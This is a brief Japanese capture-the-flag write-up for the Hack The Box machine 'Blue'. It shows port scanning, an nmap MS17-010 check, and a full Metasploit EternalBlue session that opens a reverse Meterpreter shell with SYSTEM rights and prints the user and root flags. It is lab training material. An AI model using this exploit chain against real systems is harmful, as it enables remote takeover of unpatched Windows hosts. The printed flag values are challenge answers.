https://app.hackthebox.com/machines/Blue

## STEP 1
EternalBlueの脆弱性があるっぽい
```sh
└─$ rustscan -a 10.129.155.163 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.155.163:135
Open 10.129.155.163:139
Open 10.129.155.163:445
Open 10.129.155.163:49153
Open 10.129.155.163:49156
Open 10.129.155.163:49155
Open 10.129.155.163:49152
Open 10.129.155.163:49157
Open 10.129.155.163:49154
10.129.155.163 -> [135,139,445,49153,49156,49155,49152,49157,49154]
```
```sh
└─$ nmap -n -Pn -p445 --script=smb-vuln-ms17-010 10.129.155.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 23:21 EDT
Nmap scan report for 10.129.155.163
Host is up (0.63s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/

Nmap done: 1 IP address (1 host up) scanned in 4.19 seconds
```


## STEP 2
metasploitでeternalblueによるrce、systemm権限取得！  
ユーザ・ルートフラグゲット！
```sh
msf6 > use exploit/windows/smb/ms17_010_eternalblue 
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp

msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.26.114.246   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.129.155.163
RHOSTS => 10.129.155.163

msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST tun0
LHOST => 10.10.16.23

msf6 exploit(windows/smb/ms17_010_eternalblue) > run
[*] Started reverse TCP handler on 10.10.16.23:4444 
[*] 10.129.155.163:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.129.155.163:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.129.155.163:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.129.155.163:445 - The target is vulnerable.
[*] 10.129.155.163:445 - Connecting to target for exploitation.
[+] 10.129.155.163:445 - Connection established for exploitation.
[+] 10.129.155.163:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.129.155.163:445 - CORE raw buffer dump (42 bytes)
[*] 10.129.155.163:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.129.155.163:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.129.155.163:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.129.155.163:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.129.155.163:445 - Trying exploit with 12 Groom Allocations.
[*] 10.129.155.163:445 - Sending all but last fragment of exploit packet
[*] 10.129.155.163:445 - Starting non-paged pool grooming
[+] 10.129.155.163:445 - Sending SMBv2 buffers
[+] 10.129.155.163:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.129.155.163:445 - Sending final SMBv2 buffers.
[*] 10.129.155.163:445 - Sending last fragment of exploit packet!
[*] 10.129.155.163:445 - Receiving response from exploit packet
[+] 10.129.155.163:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.129.155.163:445 - Sending egg to corrupted connection.
[*] 10.129.155.163:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.129.155.163
[*] Meterpreter session 1 opened (10.10.16.23:4444 -> 10.129.155.163:49158) at 2025-08-12 23:52:14 -0400
[+] 10.129.155.163:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.155.163:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.129.155.163:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > cat 'C:\Users\haris\Desktop\user.txt'
d7ac94309be341386a9699a3bd4de092

meterpreter > cat 'C:\Users\Administrator\Desktop\root.txt'
4a394db57ae3c0d4d63c9b89a802cd73
```
